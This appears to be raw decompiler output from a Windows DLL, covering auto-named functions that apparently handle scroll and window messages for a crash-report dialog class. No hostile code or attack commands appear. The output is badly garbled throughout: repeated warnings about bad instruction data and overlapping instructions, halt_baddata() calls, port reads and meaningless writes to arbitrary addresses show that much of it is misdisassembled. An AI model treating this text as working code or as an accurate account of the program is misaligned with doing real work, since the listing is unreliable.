      if (param_2 == 0x20e) {
        uVar1 = FUN_1002d0d0();
        *param_5 = uVar1;
        return 1;
      }
      if (param_2 != 0x1a) {
        if (param_2 == 5) {
          uVar1 = FUN_1002d2c0();
          *param_5 = uVar1;
          return 1;
        }
        if ((param_2 != 0xf) && (param_2 != 0x318)) {
          return 0;
        }
        uVar1 = FUN_1002d410();
        *param_5 = uVar1;
        return 1;
      }
      FUN_104426c6();
      FUN_10563bbe();
      goto LAB_1002ce49;
    }
    uVar1 = 0;
  }
  FUN_1002dce0(uVar1);
LAB_1002ce49:
  *param_5 = 0;
  return 1;
}



/* Function: FUN_1002cf70 */

/* WARNING: Control flow encountered bad instruction data */

undefined4 * __thiscall
FUN_1002cf70(undefined4 *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  undefined4 *puVar1;
  int extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 in_stack_ffffffe0;
  undefined4 in_stack_ffffffe4;
  undefined4 in_stack_ffffffe8;
  
  FUN_1002c850(param_2,param_1,param_4,in_stack_ffffffe0,in_stack_ffffffe4,in_stack_ffffffe8);
  *param_1 = CSendReportDlg3::vftable;
  param_1[10] = 0;
  FUN_1002ac30();
  param_1[0x1c] = param_1 + 0xb;
  param_1[0x1b] = param_1 + 5;
  param_1[10] = param_1[0x1c];
  *param_1 = CSendReportDlg3Scroll::vftable;
  if (param_1[7] != 0) {
    FUN_1030ccd9(*(undefined2 *)(param_1 + 4),param_1[3],*(undefined2 *)(param_1 + 4),0,FUN_1002ca20
                 ,param_1);
    FUN_1045f41d(extraout_ECX_00,param_1[5],5);
    return param_1;
  }
  FUN_104e0749();
  if (extraout_ECX != 0) {
                    /* WARNING: Bad instruction - Truncating control flow here */
    halt_baddata();
  }
  puVar1 = (undefined4 *)in(0x5d);
  return puVar1;
}



/* Function: FUN_1002d000 */

undefined4 __thiscall FUN_1002d000(int param_1,undefined4 param_2,undefined4 param_3)

{
  int iVar1;
  undefined4 extraout_ECX;
  uint uVar2;
  char cVar3;
  undefined4 unaff_EDI;
  int iVar4;
  
  iVar1 = (int)(short)((uint)param_3 >> 0x10);
  iVar4 = *(int *)(param_1 + 0x2c);
  if (iVar4 == -1) {
    cVar3 = (iVar1 < 1) + '\x02';
  }
  else {
    cVar3 = iVar1 < 1;
  }
  *(int *)(param_1 + 0x28) = *(int *)(param_1 + 0x28) + iVar1;
  uVar2 = (int)*(uint *)(param_1 + 0x28) >> 0x1f;
  iVar1 = (*(uint *)(param_1 + 0x28) ^ uVar2) - uVar2;
  if (iVar4 != -1) {
    iVar1 = iVar1 * iVar4;
  }
  if (*(int *)(param_1 + 0x24) < *(int *)(param_1 + 0xc)) {
    if (0 < iVar1) {
      iVar4 = (iVar1 - 1U) / 0x78 + 1;
      do {
        FUN_1002dce0(1,cVar3,param_1 + 4,*(undefined4 *)(param_1 + 0xc),
                     *(undefined4 *)(param_1 + 0x1c),*(undefined4 *)(param_1 + 0x14));
        FUN_1012cdf1(**(undefined4 **)(param_1 + 0x40),unaff_EDI);
        iVar4 = iVar4 + -1;
      } while (iVar4 != 0);
    }
  }
  else if (0 < iVar1) {
    iVar4 = (iVar1 - 1U) / 0x78 + 1;
    do {
      FUN_1002dce0(0,cVar3,param_1,*(undefined4 *)(param_1 + 8),*(undefined4 *)(param_1 + 0x18),
                   *(undefined4 *)(param_1 + 0x10));
      FUN_1011068d(extraout_ECX,**(undefined4 **)(param_1 + 0x40));
      iVar4 = iVar4 + -1;
    } while (iVar4 != 0);
  }
  *(int *)(param_1 + 0x28) = *(int *)(param_1 + 0x28) % 0x78;
  return 0;
}



/* Function: FUN_1002d0d0 */

/* WARNING: Instruction at (ram,0x1002d144) overlaps instruction at (ram,0x1002d143)
    */
/* WARNING (jumptable): Unable to track spacebase fully for stack */

void __thiscall FUN_1002d0d0(int *param_1,undefined4 param_2,undefined4 param_3)

{
  int *piVar1;
  byte *pbVar2;
  char *pcVar3;
  undefined4 *puVar4;
  uint uVar5;
  int iVar6;
  char extraout_CL;
  int iVar7;
  int iVar8;
  undefined6 *puVar9;
  undefined1 *puVar10;
  undefined2 in_CS;
  char cVar11;
  bool bVar12;
  char cVar13;
  undefined4 uVar14;
  undefined4 uVar15;
  undefined4 uVar16;
  undefined4 uVar17;
  
  puVar10 = &stack0xfffffffc;
  iVar7 = (int)(short)((uint)param_3 >> 0x10);
  iVar6 = param_1[0xd];
  if (iVar6 == -1) {
    puVar9 = (undefined6 *)((0 < iVar7) + 2);
  }
  else {
    puVar9 = (undefined6 *)(uint)(0 < iVar7);
  }
  uVar5 = param_1[0xc] + iVar7;
  param_1[0xc] = uVar5;
  iVar7 = (uVar5 ^ (int)uVar5 >> 0x1f) - ((int)uVar5 >> 0x1f);
  if (iVar6 != -1) {
    iVar7 = iVar7 * iVar6;
  }
  if ((param_1[8] < param_1[2]) && (0 < iVar7)) {
    uVar5 = (iVar7 - 1U) / 0x78;
    cVar11 = ((iVar7 - 1U) / 0x3c & 1) != 0;
    cVar13 = SCARRY4(uVar5,1);
    iVar6 = uVar5 + 1;
    do {
      bVar12 = iVar6 < 0;
      uVar14 = 0;
      uVar15 = 0;
      uVar16 = 0;
      uVar17 = 0;
      pcVar3 = (char *)param_1[2];
      *(int *)(puVar10 + -0x3c) = param_1[4];
      while( true ) {
        *(int *)(puVar10 + -0x38) = param_1[6];
        puVar4 = (undefined4 *)param_1[0x10];
        *(undefined4 *)(puVar10 + -0x30) = uVar14;
        *(undefined4 *)(puVar10 + -0x2c) = uVar15;
        *(undefined4 *)(puVar10 + -0x28) = uVar16;
        *(undefined4 *)(puVar10 + -0x24) = uVar17;
        FUN_104d2ee4(*puVar4,puVar10 + -0x30);
        puVar10 = (undefined1 *)*puVar9;
        if ((bool)cVar13 != bVar12) break;
        param_1 = (int *)((int)param_1 + 1);
        cVar13 = SCARRY1(*pcVar3,extraout_CL) != SCARRY1(*pcVar3 + extraout_CL,cVar11);
        *pcVar3 = *pcVar3 + extraout_CL + cVar11;
        bVar12 = *pcVar3 < '\0';
        pbVar2 = (byte *)((int)puVar9 + 0x4589087e);
        *pbVar2 = *pbVar2 >> 4 | *pbVar2 << 4;
        cVar11 = (char)*pbVar2 < '\0';
      }
      *(char **)(puVar10 + -0x34) = pcVar3;
      if (bVar12) goto switchD_1002d17e_default;
      cVar11 = puVar9 < (undefined6 *)0x7;
      switch(puVar9) {
      case (undefined6 *)0x0:
        iVar6 = *param_1;
        iVar7 = *(int *)(puVar10 + -0x3c);
        if (iVar6 < iVar7) goto LAB_1002d1ac;
        iVar6 = iVar6 - iVar7;
        goto LAB_1002d22a;
      case (undefined6 *)0x1:
        iVar8 = *(int *)(puVar10 + -0x3c);
        goto LAB_1002d1b9;
      case (undefined6 *)0x2:
        iVar6 = *param_1;
        iVar7 = *(int *)(puVar10 + -0x38);
        if (iVar7 <= iVar6) {
          iVar6 = iVar6 - iVar7;
          goto LAB_1002d22a;
        }
LAB_1002d1ac:
        *param_1 = 0;
        goto LAB_1002d22c;
      case (undefined6 *)0x3:
        iVar8 = *(int *)(puVar10 + -0x38);
LAB_1002d1b9:
        iVar7 = *param_1;
        if (iVar7 < (int)pcVar3 - iVar8) {
          iVar6 = iVar7 + iVar8;
          iVar7 = -iVar8;
        }
        else {
          iVar6 = *(int *)(puVar10 + -0x34);
LAB_1002d228:
          iVar7 = iVar7 - iVar6;
        }
LAB_1002d22a:
        *param_1 = iVar6;
        iVar6 = iVar7;
        goto LAB_1002d22c;
      case (undefined6 *)0x4:
switchD_1002d17e_caseD_4:
        *(undefined4 *)(puVar10 + -0x20) = 0x1c;
        puVar4 = (undefined4 *)param_1[0x10];
        *(undefined4 *)(puVar10 + -0x1c) = 0x10;
        *(undefined4 *)(puVar10 + -0x18) = 0;
        *(undefined4 *)(puVar10 + -0x14) = 0;
        *(undefined4 *)(puVar10 + -0x10) = 0;
        *(undefined4 *)(puVar10 + -0xc) = 0;
        *(undefined4 *)(puVar10 + -8) = 0;
        iVar6 = FUN_104a4cb0(param_1,*puVar4,0,puVar10 + -0x20);
        cVar11 = '\0';
        if (iVar6 != 0) {
          iVar6 = *(int *)(puVar10 + -8);
          goto LAB_1002d226;
        }
        break;
      case (undefined6 *)0x5:
        cVar11 = '\0';
        if (((uint)param_1[0xf] >> 2 & 1) == 0) goto switchD_1002d17e_caseD_4;
        break;
      case (undefined6 *)0x6:
        iVar6 = *param_1;
        *param_1 = 0;
LAB_1002d22c:
        cVar11 = '\0';
        if (iVar6 == 0) break;
        uVar14 = 1;
        FUN_1058cf30((undefined4 *)param_1[0x10],*(undefined4 *)param_1[0x10],0,*param_1,1);
        FUN_10581baf(*(undefined4 *)param_1[0x10],iVar6,0,0,0,0,0,param_1[0xe]);
        *(undefined2 *)((int)puVar9 + 0x30ff4046) = in_CS;
        goto code_r0x1002d25f;
      case (undefined6 *)0x7:
        iVar6 = *(int *)(puVar10 + -0x34);
LAB_1002d226:
        iVar7 = *param_1;
        goto LAB_1002d228;
      }
switchD_1002d17e_default:
      uVar14 = *(undefined4 *)param_1[0x10];
code_r0x1002d25f:
      FUN_10351ca4(puVar10,uVar14);
      piVar1 = (int *)(puVar10 + -0x40);
      cVar13 = SBORROW4(*piVar1,1);
      *piVar1 = *piVar1 + -1;
      iVar6 = *piVar1;
    } while (*piVar1 != 0);
  }
  param_1[0xc] = param_1[0xc] % 0x78;
  FUN_100579df();
  return;
}



/* Function: FUN_1002d2c0 */

/* WARNING: Type propagation algorithm not settling */

void __thiscall FUN_1002d2c0(int *param_1)

{
  int iVar1;
  int iVar2;
  char cVar3;
  int iVar4;
  undefined4 extraout_ECX;
  code *unaff_ESI;
  undefined4 uVar5;
  undefined8 uVar6;
  undefined4 *in_stack_00000010;
  int local_2c;
  int local_28 [6];
  undefined8 local_10;
  uint local_8;
  
  local_8 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  uVar5 = 0;
  local_28[2] = 0;
  local_28[3] = 0;
  local_28[4] = 0;
  local_28[5] = 0;
  uVar6 = FUN_1032937b();
  local_28[5] = (int)((ulonglong)uVar6 >> 0x20);
  param_1[9] = (int)uVar6;
  local_28[4] = param_1[2] + -1;
  local_28[2] = extraout_ECX;
  if ((*(byte *)(param_1 + 0xf) & 0x20) != 0) {
    local_28[2] = 0xf;
  }
  local_10 = CONCAT44(uVar5,*param_1);
  param_1[8] = local_28[5];
  local_28[1] = 0x1c;
  local_28[3] = 0;
  (*unaff_ESI)(*(undefined4 *)param_1[0x10],0,local_28 + 1,1);
  local_28[4] = param_1[3] + -1;
  local_28[2] = 7;
  if ((*(byte *)(param_1 + 0xf) & 0x10) != 0) {
    local_28[2] = 0xf;
  }
  local_28[1] = 0x1c;
  local_28[5] = param_1[9];
  local_10 = (ulonglong)(uint)param_1[1];
  local_28[3] = 0;
  (*unaff_ESI)(*(undefined4 *)param_1[0x10],1,local_28 + 1,1);
  local_28[0] = *param_1;
  iVar1 = param_1[1];
  local_2c = iVar1;
  cVar3 = FUN_10029ca0(local_28,&local_2c);
  iVar2 = local_28[0];
  if (cVar3 == '\0') {
    *in_stack_00000010 = 0;
  }
  else {
    iVar4 = *param_1 - local_28[0];
    uVar5 = *(undefined4 *)param_1[0x10];
    FUN_1041111d(uVar5,iVar4,iVar1 - local_2c,0,0,0,0,param_1[0xe] & 0xfffffffe);
    FUN_1002d650(iVar2,uVar5,iVar4);
    *in_stack_00000010 = 0;
  }
  FUN_100579df();
  return;
}



/* Function: FUN_1002d410 */

/* WARNING: Control flow encountered bad instruction data */

void __thiscall FUN_1002d410(code *param_1,undefined4 param_2,int param_3)

{
  int iVar1;
  code *pcVar2;
  int extraout_ECX;
  code *unaff_ESI;
  undefined4 unaff_EDI;
  char cVar3;
  undefined4 local_5c;
  undefined4 local_58;
  undefined4 local_54;
  undefined4 local_50;
  undefined1 local_4c [68];
  uint local_8;
  
  do {
    pcVar2 = param_1;
    local_8 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
    cVar3 = param_3 == 0;
    if (!(bool)cVar3) {
      local_5c = 0;
      local_58 = 0;
      iVar1 = FUN_101001e1(pcVar2,-*(int *)(pcVar2 + 4),&local_5c);
      (*pcVar2)(param_3,-iVar1);
      (*pcVar2)(param_3,local_5c,local_58,0);
      FUN_100579df();
      return;
    }
    local_50 = **(undefined4 **)(pcVar2 + 0x40);
    local_54 = 0;
    FUN_1010a04c(local_50,local_4c,unaff_EDI,unaff_ESI);
    unaff_EDI = 0;
    param_1 = (code *)(extraout_ECX + -1);
    unaff_ESI = pcVar2;
  } while ((code *)(extraout_ECX + -1) != (code *)0x0 && cVar3 == '\0');
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: FUN_1002d4d0 */

/* WARNING: Instruction at (ram,0x1002d4fa) overlaps instruction at (ram,0x1002d4f9)
    */

void __fastcall FUN_1002d4d0(int param_1)

{
  char *pcVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  char extraout_CL;
  byte extraout_DL;
  int unaff_EBX;
  int iVar6;
  byte bVar7;
  bool bVar8;
  char cVar9;
  char cVar10;
  undefined4 local_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  uint local_8;
  
  bVar7 = 0;
  cVar10 = '\0';
  local_8 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  cVar9 = (int)local_8 < 0;
  bVar8 = local_8 == 0;
  iVar2 = *(int *)(param_1 + 0xc);
  local_18 = 0;
  uStack_14 = 0;
  uStack_10 = 0;
  uStack_c = 0;
  uVar5 = FUN_1032f2fb(**(undefined4 **)(param_1 + 0x40),&local_18);
  if (bVar8 || cVar10 != cVar9) {
    while (cVar10 == cVar9) {
      uVar3 = (uint)bVar7;
      bVar8 = SBORROW4(uVar5,0x2b7f0030);
      uVar4 = uVar5 + 0xd480ffd0;
      bVar7 = uVar5 < 0x2b7f0030 || uVar4 < uVar3;
      uVar5 = uVar4 - uVar3;
      cVar9 = (int)uVar5 < 0;
      cVar10 = bVar8 != SBORROW4(uVar4,uVar3);
    }
    if (!(bool)cVar9) {
      iVar6 = *(int *)(param_1 + 4);
      *(int *)(param_1 + 4) = iVar2;
      iVar6 = iVar6 - iVar2;
      if (iVar6 != 0) {
        FUN_1015e4e6(*(undefined4 **)(param_1 + 0x40),**(undefined4 **)(param_1 + 0x40),1,iVar2,1);
        func_0x1039e04d(param_1,**(undefined4 **)(param_1 + 0x40),0,iVar6,0,0,0,0,
                        *(undefined4 *)(param_1 + 0x38));
      }
    }
  }
  else {
    *(char *)(unaff_EBX + 0x6a) = *(char *)(unaff_EBX + 0x6a) + extraout_DL;
    *(byte *)(param_1 + -0x18) = *(byte *)(param_1 + -0x18) ^ extraout_DL;
    pcVar1 = (char *)(CONCAT22((short)((uint)unaff_EBX >> 0x10),
                               CONCAT11((char)((uint)unaff_EBX >> 8) * '\x02',(char)unaff_EBX)) +
                     -0x3fcc03b3);
    *pcVar1 = *pcVar1 + extraout_CL;
  }
  FUN_100579df();
  return;
}



/* Function: FUN_1002d550 */

/* WARNING: Instruction at (ram,0x1002d5b9) overlaps instruction at (ram,0x1002d5b8)
    */

void __fastcall FUN_1002d550(int *param_1)

{
  char cVar1;
  int unaff_EBX;
  undefined4 *puVar2;
  undefined4 **ppuVar3;
  int iVar4;
  bool bVar5;
  int *in_stack_ffff8a55;
  undefined4 *apuStack_34 [4];
  undefined4 local_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  uint local_8;
  
  puVar2 = (undefined4 *)&stack0xfffffffc;
  local_8 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  bVar5 = (int)local_8 < 0;
  apuStack_34[3] = &local_18;
  local_18 = 0;
  uStack_14 = 0;
  uStack_10 = 0;
  uStack_c = 0;
  iVar4 = param_1[2];
  apuStack_34[2] = *(undefined4 **)param_1[0x10];
  apuStack_34[1] = (undefined4 *)0x1002d57d;
  FUN_104c6382();
  ppuVar3 = apuStack_34 + 1;
  cVar1 = '\x13';
  do {
    puVar2 = puVar2 + -1;
    ppuVar3 = ppuVar3 + -1;
    *ppuVar3 = (undefined4 *)*puVar2;
    cVar1 = cVar1 + -1;
  } while ('\0' < cVar1);
  if (!bVar5) {
    iVar4 = *param_1;
    *param_1 = 0;
    if (iVar4 != 0) goto code_r0x1002d58f;
  }
  param_1 = in_stack_ffff8a55;
code_r0x1002d58f:
  apuStack_34[1] = (undefined4 *)&stack0xfffffffc;
  FUN_1032df9e((undefined4 *)param_1[0x10],*(undefined4 *)param_1[0x10],0,0,1);
  FUN_103113e4(*(undefined4 *)param_1[0x10],iVar4,0,0,0,0,0,param_1[0xe]);
  *(uint *)(unaff_EBX + -0x3fcc03b3) = *(uint *)(unaff_EBX + -0x3fcc03b3) | 0x5f;
  FUN_100579df();
  return;
}



/* Function: FUN_1002d5d0 */

/* WARNING: Instruction at (ram,0x1002d6af) overlaps instruction at (ram,0x1002d6ae)
    */

void __thiscall FUN_1002d5d0(code *param_1,int param_2)

{
  byte bVar1;
  int iVar2;
  undefined1 uVar3;
  undefined4 uVar4;
  undefined4 *puVar5;
  int extraout_ECX;
  int *piVar6;
  int *extraout_ECX_00;
  int *piVar7;
  uint uVar8;
  uint ***pppuVar9;
  code *pcVar10;
  undefined1 *puVar11;
  int iVar12;
  int *piVar13;
  undefined4 uVar14;
  undefined4 uVar15;
  uint *puVar16;
  undefined8 uVar17;
  undefined6 uVar18;
  uint ***pppuStack_28;
  uint *local_18;
  undefined8 uStack_14;
  uint uStack_c;
  uint local_8;
  
  puVar11 = &stack0xfffffffc;
  local_8 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  pppuStack_28 = (uint ***)&local_18;
  iVar12 = *(int *)(param_1 + 8);
  local_18 = (uint *)0x0;
  uStack_14 = 0;
  uStack_c = 0;
  uVar4 = **(undefined4 **)(param_1 + 0x40);
  FUN_104bc123(uVar4);
  iVar12 = iVar12 - uStack_14._4_4_;
  if (-1 < iVar12) {
    iVar2 = *(int *)param_1;
    *(int *)param_1 = iVar12;
    pppuVar9 = (uint ***)(iVar2 - iVar12);
    if (pppuVar9 != (uint ***)0x0) {
      uVar17 = FUN_104c5e4d(**(undefined4 **)(param_1 + 0x40),0,iVar12,1,uVar4);
      uVar8 = (uint)((ulonglong)uVar17 >> 0x20);
      pppuStack_28 = (uint ***)uVar17;
      if (iVar12 == 0) {
        piVar6 = (int *)(extraout_ECX + -1);
        if (piVar6 == (int *)0x0 || iVar12 == 0) {
          *pppuStack_28 = (uint **)((uint)*pppuStack_28 | uVar8);
          uStack_c = (uint)pppuStack_28 ^ (uint)&stack0xfffffffc;
          pcVar10 = param_1;
          pppuStack_28 = pppuVar9;
          FUN_10029ca0(&param_2,&stack0x00000008);
          uVar14 = 0;
          uVar15 = 0;
          puVar16 = (uint *)0x0;
          pppuVar9 = (uint ***)(*piVar6 - param_2);
          uVar4 = FUN_101294ca(iVar12,pcVar10);
          *(undefined4 *)(extraout_ECX + 3) = uVar4;
          uStack_14 = CONCAT44(uVar15,uVar14);
          pppuStack_28 = (uint ***)&pppuStack_28;
          piVar7 = extraout_ECX_00;
          piVar13 = piVar6;
          local_18 = puVar16;
        }
        else {
          puVar11 = &stack0xfffffffd;
          piVar13 = (int *)0x0;
          piVar7 = piVar6;
        }
        puVar5 = (undefined4 *)piVar13[0x10];
        *piVar13 = (int)piVar7;
        *(undefined4 *)(puVar11 + -0x24) = 0x1c;
        *(int **)(puVar11 + -0x10) = piVar7;
        uVar4 = *puVar5;
        *(uint ****)(puVar11 + -0x2c) = pppuVar9;
        (*param_1)(uVar4,0);
        bVar1 = *(byte *)(piVar13 + 0xf);
        *(undefined8 *)(puVar11 + -0x10) = 0;
        uVar4 = 4;
        *(undefined4 *)(puVar11 + -0x24) = 0x1c;
        if ((bVar1 & 0x10) != 0) {
          uVar4 = 0xc;
        }
        *(undefined4 *)(puVar11 + -0x20) = 0;
        *(undefined4 *)(puVar11 + -0x1c) = 0;
        *(undefined4 *)(puVar11 + -0x18) = 0;
        *(undefined4 *)(puVar11 + -0x14) = 0;
        *(undefined4 *)(puVar11 + -0x20) = uVar4;
        *(int *)(puVar11 + -0x10) = piVar13[1];
        pcVar10 = *(code **)piVar13[0x10];
        (*param_1)(pcVar10,1,puVar11 + -0x24,0);
        if (((*(byte *)(piVar13 + 0xf) & 1) != 0) &&
           ((pppuVar9 != (uint ***)0x0 || (*(int *)(puVar11 + -0x28) != 0)))) {
          puVar5 = (undefined4 *)FUN_104e5afe();
          iVar12 = (*pcVar10)(*puVar5,5);
          while (iVar12 != 0) {
            *(undefined4 *)(puVar11 + -0x18) = 0;
            *(undefined4 *)(puVar11 + -0x14) = 0;
            *(undefined4 *)(puVar11 + -0x10) = 0;
            *(undefined4 *)(puVar11 + -0xc) = 0;
            FUN_10290162(puVar11 + -0x18,iVar12,puVar11 + -0x18);
            uVar18 = FUN_1044ad59(0,*(undefined4 *)piVar13[0x10],puVar11 + -0x18,1);
            pcVar10 = (code *)CONCAT22((short)((uint)pcVar10 >> 0x10),CONCAT11(0x8b,(char)pcVar10));
            uVar3 = in((short)((uint6)uVar18 >> 0x20));
            FUN_1018ed0a(iVar12,0,*(int *)(puVar11 + -0x17) + *(int *)(puVar11 + -0x2b),
                         CONCAT31((int3)((uint6)uVar18 >> 8),uVar3) + *(int *)(puVar11 + -0x27),0,0,
                         0x15);
            iVar12 = (*pcVar10)(iVar12);
            puVar11 = puVar11 + 1;
          }
        }
        FUN_100579df();
        return;
      }
      pppuStack_28 = (uint ***)0x0;
      FUN_102556d1(uVar8,**(undefined4 **)(param_1 + 0x40),pppuVar9,0,0,0,0);
    }
  }
  FUN_100579df();
  return;
}



/* Function: FUN_1002d650 */

void __thiscall FUN_1002d650(int *param_1,int param_2)

{
  undefined1 *puVar1;
  undefined1 uVar2;
  undefined4 *puVar3;
  int extraout_ECX;
  int iVar4;
  code *pcVar5;
  code *unaff_ESI;
  bool bVar6;
  undefined4 uVar7;
  undefined4 uVar8;
  undefined4 uVar9;
  undefined8 uVar10;
  undefined6 uVar11;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 uStack_20;
  undefined4 uStack_1c;
  undefined4 uStack_18;
  undefined8 local_14;
  uint local_c;
  
  local_c = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  FUN_10029ca0(&param_2,&stack0x00000008);
  uVar7 = 0;
  uVar8 = 0;
  uVar9 = 0;
  iVar4 = *param_1 - param_2;
  bVar6 = (*(byte *)(param_1 + 0xf) & 0x20) == 0;
  uVar10 = FUN_101294ca();
  param_1[1] = (int)uVar10;
  local_24 = 4;
  if (!bVar6) {
    local_24 = 0xc;
  }
  *param_1 = extraout_ECX;
  local_28 = 0x1c;
  local_14 = CONCAT44(uVar7,extraout_ECX);
  uStack_20 = uVar7;
  uStack_1c = uVar8;
  uStack_18 = uVar9;
  (*unaff_ESI)(*(undefined4 *)param_1[0x10],0,&local_28,0,iVar4);
  local_24 = 4;
  local_28 = 0x1c;
  if ((*(byte *)(param_1 + 0xf) & 0x10) != 0) {
    local_24 = 0xc;
  }
  uStack_20 = 0;
  uStack_1c = 0;
  uStack_18 = 0;
  local_14 = (ulonglong)(uint)param_1[1];
  pcVar5 = *(code **)param_1[0x10];
  (*unaff_ESI)(pcVar5,1,&local_28,0);
  if (((*(byte *)(param_1 + 0xf) & 1) != 0) &&
     ((iVar4 != 0 || ((int)((ulonglong)uVar10 >> 0x20) != 0)))) {
    puVar3 = (undefined4 *)FUN_104e5afe();
    iVar4 = (*pcVar5)(*puVar3,5);
    puVar1 = &stack0xfffffffc;
    while (iVar4 != 0) {
      *(undefined4 *)(puVar1 + -0x18) = 0;
      *(undefined4 *)(puVar1 + -0x14) = 0;
      *(undefined4 *)(puVar1 + -0x10) = 0;
      *(undefined4 *)(puVar1 + -0xc) = 0;
      FUN_10290162(puVar1 + -0x18,iVar4,puVar1 + -0x18);
      uVar11 = FUN_1044ad59(0,*(undefined4 *)param_1[0x10],puVar1 + -0x18,1);
      pcVar5 = (code *)CONCAT22((short)((uint)pcVar5 >> 0x10),CONCAT11(0x8b,(char)pcVar5));
      uVar2 = in((short)((uint6)uVar11 >> 0x20));
      FUN_1018ed0a(iVar4,0,*(int *)(puVar1 + -0x17) + *(int *)(puVar1 + -0x2b),
                   CONCAT31((int3)((uint6)uVar11 >> 8),uVar2) + *(int *)(puVar1 + -0x27),0,0,0x15);
      iVar4 = (*pcVar5)(iVar4);
      puVar1 = puVar1 + 1;
    }
  }
  FUN_100579df();
  return;
}



/* Function: FUN_1002d7a0 */

void __fastcall FUN_1002d7a0(int param_1)

{
  int iVar1;
  int iVar2;
  int iVar3;
  undefined4 local_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  int iStack_c;
  uint local_8;
  
  local_8 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  local_18 = 0;
  uStack_14 = 0;
  uStack_10 = 0;
  iStack_c = 0;
  iVar1 = *(int *)(param_1 + 0x14);
  iVar3 = *(int *)(param_1 + 0xc);
  FUN_1026e2f6(iVar1,**(undefined4 **)(param_1 + 0x40),&local_18);
  iVar3 = iVar3 - iStack_c;
  if (-1 < iVar3) {
    iVar2 = *(int *)(param_1 + 4);
    if (iVar2 < iVar3 - iVar1) {
      iVar3 = -iVar1;
      *(int *)(param_1 + 4) = iVar1 + iVar2;
    }
    else {
      *(int *)(param_1 + 4) = iVar3;
      iVar3 = iVar2 - iVar3;
    }
    if (iVar3 != 0) {
      FUN_1056e3e0(**(undefined4 **)(param_1 + 0x40),1,*(undefined4 *)(param_1 + 4),1);
      return;
    }
  }
  FUN_100579df();
  return;
}



/* Function: FUN_1002d840 */

void __fastcall FUN_1002d840(int param_1)

{
  int iVar1;
  int extraout_ECX;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  int iVar2;
  int iVar3;
  int iVar4;
  bool bVar5;
  bool bVar6;
  undefined4 uVar7;
  undefined4 uVar8;
  undefined4 uVar9;
  undefined4 local_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  int iStack_c;
  uint local_8;
  
  local_8 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  local_18 = 0;
  uStack_14 = 0;
  uStack_10 = 0;
  iStack_c = 0;
  iVar1 = *(int *)(param_1 + 0x14);
  iVar4 = *(int *)(param_1 + 0xc);
  FUN_10323abe(iVar1,**(undefined4 **)(param_1 + 0x40),&local_18);
  iVar4 = iVar4 - iStack_c;
  if (-1 < iVar4) {
    iVar2 = *(int *)(param_1 + 4);
    if (iVar2 < iVar1) {
      *(undefined4 *)(param_1 + 4) = 0;
    }
    else {
      *(int *)(param_1 + 4) = iVar2 - iVar1;
      iVar2 = iVar1;
    }
    bVar5 = false;
    bVar6 = iVar2 == 0;
    if (!bVar6) {
      uVar9 = 1;
      uVar8 = *(undefined4 *)(param_1 + 4);
      uVar7 = 1;
      FUN_1066d419(**(undefined4 **)(param_1 + 0x40));
      if (!bVar5 && !bVar6) {
        local_18 = 0;
        uStack_14 = 0;
        uStack_10 = 0;
        iStack_c = 0;
        iVar1 = *(int *)(extraout_ECX + 0x1c);
        iVar3 = *(int *)(extraout_ECX + 0xc);
        FUN_101a60db(*(undefined4 **)(extraout_ECX + 0x40),**(undefined4 **)(extraout_ECX + 0x40),
                     &local_18,param_1,iVar4,iVar2,uVar7,uVar8,uVar9);
        iVar3 = iVar3 - iStack_c;
        if (-1 < iVar3) {
          iVar4 = *(int *)(extraout_ECX + 4);
          if (iVar4 < iVar3 - iVar1) {
            iVar3 = -iVar1;
            *(int *)(extraout_ECX + 4) = iVar1 + iVar4;
          }
          else {
            *(int *)(extraout_ECX + 4) = iVar3;
            iVar3 = iVar4 - iVar3;
          }
          if (iVar3 != 0) {
            FUN_1033a9db(extraout_EDX_00,**(undefined4 **)(extraout_ECX + 0x40),1,
                         *(undefined4 *)(extraout_ECX + 4),1);
            FUN_10358603(extraout_EDX_01,**(undefined4 **)(extraout_ECX + 0x40),0,iVar3,0,0,0,0,
                         *(undefined4 *)(extraout_ECX + 0x38));
          }
        }
        FUN_100579df();
        return;
      }
      FUN_10680b77(extraout_EDX,**(undefined4 **)(param_1 + 0x40),0,iVar2,0,0,0,0);
    }
  }
  FUN_100579df();
  return;
}



/* Function: FUN_1002d8d0 */

void __fastcall FUN_1002d8d0(int param_1)

{
  int iVar1;
  int iVar2;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  int iVar3;
  undefined4 uStack_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  int iStack_c;
  uint uStack_8;
  
  uStack_8 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  uStack_18 = 0;
  uStack_14 = 0;
  uStack_10 = 0;
  iStack_c = 0;
  iVar1 = *(int *)(param_1 + 0x1c);
  iVar3 = *(int *)(param_1 + 0xc);
  FUN_101a60db(*(undefined4 **)(param_1 + 0x40),**(undefined4 **)(param_1 + 0x40),&uStack_18);
  iVar3 = iVar3 - iStack_c;
  if (-1 < iVar3) {
    iVar2 = *(int *)(param_1 + 4);
    if (iVar2 < iVar3 - iVar1) {
      iVar3 = -iVar1;
      *(int *)(param_1 + 4) = iVar1 + iVar2;
    }
    else {
      *(int *)(param_1 + 4) = iVar3;
      iVar3 = iVar2 - iVar3;
    }
    if (iVar3 != 0) {
      FUN_1033a9db(extraout_EDX,**(undefined4 **)(param_1 + 0x40),1,*(undefined4 *)(param_1 + 4),1);
      FUN_10358603(extraout_EDX_00,**(undefined4 **)(param_1 + 0x40),0,iVar3,0,0,0,0,
                   *(undefined4 *)(param_1 + 0x38));
    }
  }
  FUN_100579df();
  return;
}



